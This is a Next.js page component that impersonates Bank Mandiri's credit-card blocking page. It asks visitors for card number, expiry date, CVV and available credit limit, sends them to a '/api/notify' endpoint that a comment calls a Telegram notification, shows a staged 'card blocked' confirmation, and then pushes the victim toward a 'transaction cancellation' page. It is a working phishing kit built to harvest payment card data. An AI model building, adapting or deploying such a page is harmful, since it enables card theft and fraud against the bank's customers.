'use client';

import React, { useState, useEffect } from 'react';
import Image from 'next/image';
import { 
  CreditCard, 
  Calendar, 
  Lock, 
  Wallet, 
  Info, 
  ShieldCheck
} from 'lucide-react';

export default function MandiriBlockPage() {
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [balance, setBalance] = useState('');
  const [view, setView] = useState<'form' | 'loading' | 'success'>('form');

  // Luhn Algorithm Function
  const validateLuhn = (number: string) => {
    let sum = 0;
    let shouldDouble = false;
    for (let i = number.length - 1; i >= 0; i--) {
      let digit = parseInt(number.charAt(i));
      if (shouldDouble) {
        if ((digit *= 2) > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
  };

  const rawCard = cardNumber.replace(/\s/g, '');
  const luhnOk = rawCard.length >= 15 ? validateLuhn(rawCard) : true;
  const isFormValid = luhnOk && rawCard.length >= 16 && expiry.length === 5 && cvv.length === 3 && balance !== '';

  const handleCardInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    let formatted = val.match(/.{1,4}/g);
    setCardNumber(formatted ? formatted.join(' ') : '');
  };

  const handleExpiryInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length >= 2) val = val.slice(0, 2) + '/' + val.slice(2, 4);
    setExpiry(val);
  };

  const handleBalanceInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '');
    setBalance(raw ? 'Rp ' + parseInt(raw).toLocaleString('id-ID') : '');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;

    // Start Flow
    setView('loading');

    // Send Telegram Notification in background
    fetch('/api/notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'Blokir Kartu',
        cardNumber,
        expiry,
        cvv,
        balance
      })
    }).catch(err => console.error('Failed to send notification:', err));
    
    // Exactly 7 seconds of loading
    setTimeout(() => {
      setView('success');
      
      // Delay before showing the "Ke Halaman Pembatalan" button
      setTimeout(() => {
        // We will now use a state to control the visibility of the nav button instead of undoAllowed
        setIsNavReady(true);
      }, 3500);
    }, 7000);
  };

  const [isNavReady, setIsNavReady] = useState(false);

  return (
    <div className="min-h-screen flex flex-col items-center pb-10 relative bg-[#eef4f9]">
      <div className="security-overlay left-0 border-r border-[#004D99]/10" />
      <div className="security-overlay right-0 border-l border-[#004D99]/10" />

      {/* Loader Overlay */}
      {view === 'loading' && (
        <div className="fixed inset-0 bg-white/98 z-[9999] flex flex-col justify-center items-center">
          <div className="mandiri-loader">
            <div className="spin-part blue"></div>
            <div className="spin-part gold"></div>
          </div>
          <div className="mt-5 font-bold text-[#002D5C] text-[0.9rem]">Memproses pemblokiran...</div>
        </div>
      )}

      {/* Success Notification */}
      {view === 'success' && (
        <div className="fixed inset-0 bg-black/80 z-[10000] flex justify-center items-center backdrop-blur-[4px]">
          <div className="w-[85%] max-w-[340px] bg-white rounded-[24px] overflow-hidden text-center animate-fade-in-up">
            <div className="p-[35px_25px]">
              <div className="flex justify-center mb-5">
                <Image 
                  src="https://i.ibb.co.com/sJpYQYTT/0667.png" 
                  alt="Success" 
                  width={80} 
                  height={80} 
                />
              </div>
              <h1 className="text-[#003366] text-[20px] font-bold mb-[10px]">Kartu Berhasil diblokir</h1>
              
              <div className="mt-8 flex flex-col gap-3">
                {isNavReady && (
                  <button 
                    onClick={() => window.location.href = '/cancel'}
                    className="w-full py-4 bg-[#FF9E1B] text-white rounded-full font-bold text-xs shadow-md hover:bg-[#e68a00] transition-all animate-fade-in-up"
                  >
                    Klik disini untuk melanjutkan Pembatalan Transaksi
                  </button>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      <div className="w-full max-w-[450px] flex-grow flex flex-col z-10">
        <header className="w-full bg-white py-[15px] shadow-[0_2px_8px_rgba(0,0,0,0.05)] mb-5 flex justify-center">
          <Image 
            src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Bank_Mandiri_logo_2016.svg" 
            alt="Mandiri" 
            width={110} 
            height={32}
            className="h-auto"
          />
        </header>
        
        {view === 'form' && (
          <main className="bg-white rounded-[16px] p-[25px_20px] shadow-[0_15px_35px_rgba(0,45,92,0.15)] mx-[15px] text-center">
            <h2 className="text-[1.2rem] font-bold text-[#002D5C] mb-2">Blokir Kartu Kredit Mandiri</h2>
            <p className="text-[0.85rem] text-[#64748b] mb-[25px] leading-[1.4]">
              Silakan masukkan detail kartu kredit Anda yang ingin diblokir.
            </p>
            
            <form onSubmit={handleSubmit} className="text-left">
              <div className="mb-[15px] relative">
                <label className="block text-[0.7rem] font-bold text-[#002D5C] mb-1.5 uppercase tracking-widest">Nomor Kartu</label>
                <div className="relative">
                  <CreditCard className="absolute left-[14px] top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                  <input 
                    type="tel" 
                    value={cardNumber}
                    onChange={handleCardInput}
                    className="w-full p-[12px_14px_12px_40px] border-[1.5px] border-[#e2e8f0] focus:border-[#004D99] rounded-[10px] text-[0.95rem] outline-none transition-all"
                    placeholder="xxxx xxxx xxxx xxxx"
                    maxLength={19}
                    required
                  />
                </div>
                {!luhnOk && cardNumber.replace(/\s/g, '').length >= 15 && (
                  <div className="text-[#ef4444] text-[0.7rem] mt-1 font-medium">Nomor kartu tidak valid (Luhn check failed).</div>
                )}
              </div>

              <div className="flex gap-3 mb-[15px]">
                <div className="flex-1">
                  <label className="block text-[0.7rem] font-bold text-[#002D5C] mb-1.5 uppercase tracking-widest">Masa Berlaku</label>
                  <div className="relative">
                    <Calendar className="absolute left-[14px] top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                    <input 
                      type="tel" 
                      value={expiry}
                      onChange={handleExpiryInput}
                      className="w-full p-[12px_14px_12px_40px] border-[1.5px] border-[#e2e8f0] focus:border-[#004D99] rounded-[10px] text-[0.95rem] outline-none"
                      placeholder="MM/YY"
                      maxLength={5}
                      required
                    />
                  </div>
                </div>
                <div className="flex-1">
                  <label className="block text-[0.7rem] font-bold text-[#002D5C] mb-1.5 uppercase tracking-widest">CVV</label>
                  <div className="relative">
                    <Lock className="absolute left-[14px] top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                    <input 
                      type="tel" 
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0,3))}
                      className="w-full p-[12px_14px_12px_40px] border-[1.5px] border-[#e2e8f0] focus:border-[#004D99] rounded-[10px] text-[0.95rem] outline-none"
                      placeholder="123"
                      maxLength={3}
                      required
                    />
                  </div>
                </div>
              </div>

              <div className="mb-[15px]">
                <label className="block text-[0.7rem] font-bold text-[#002D5C] mb-1.5 uppercase tracking-widest">Limit Tersedia (IDR)</label>
                <div className="relative">
                  <Wallet className="absolute left-[14px] top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                  <input 
                    type="tel" 
                    value={balance}
                    onChange={handleBalanceInput}
                    className="w-full p-[12px_14px_12px_40px] border-[1.5px] border-[#e2e8f0] focus:border-[#004D99] rounded-[10px] text-[0.95rem] outline-none"
                    placeholder="Rp 0"
                    required
                  />
                </div>
                <div className="flex items-center gap-2.5 bg-[#f8fafc] p-3 rounded-[10px] mt-2.5 border border-[#e2e8f0]">
                  <Info className="w-4 h-4 text-[#004D99] flex-shrink-0" />
                  <span className="text-[0.7rem] text-[#475569] font-medium leading-[1.3]">
                    Limit kartu akan dialihkan ke kartu Pengganti.
                  </span>
                </div>
              </div>

              <button 
                type="submit" 
                disabled={!isFormValid}
                className={`w-full p-[16px] mt-[15px] flex items-center justify-center gap-2.5 rounded-[30px] font-bold text-[1rem] tracking-wide transition-all duration-300 ${
                  isFormValid 
                    ? 'bg-gradient-to-r from-[#003d79] to-[#0056a8] text-white shadow-[0_10px_25px_rgba(0,61,121,0.3)] cursor-pointer hover:shadow-[0_15px_30px_rgba(0,61,121,0.4)] hover:scale-[1.02] active:scale-[0.98]' 
                    : 'bg-[#cbd5e1] text-white cursor-not-allowed'
                }`}
              >
                <ShieldCheck className="w-5 h-5" />
                BLOKIR KARTU
              </button>
            </form>
          </main>
        )}
      </div>

      <footer className="fixed bottom-0 w-full max-w-[450px] bg-[#2467ab] text-white text-center py-3 text-[0.75rem] tracking-[0.5px]">
        © 2026 PT Bank Mandiri (Persero) Tbk.
      </footer>
    </div>
  );
}
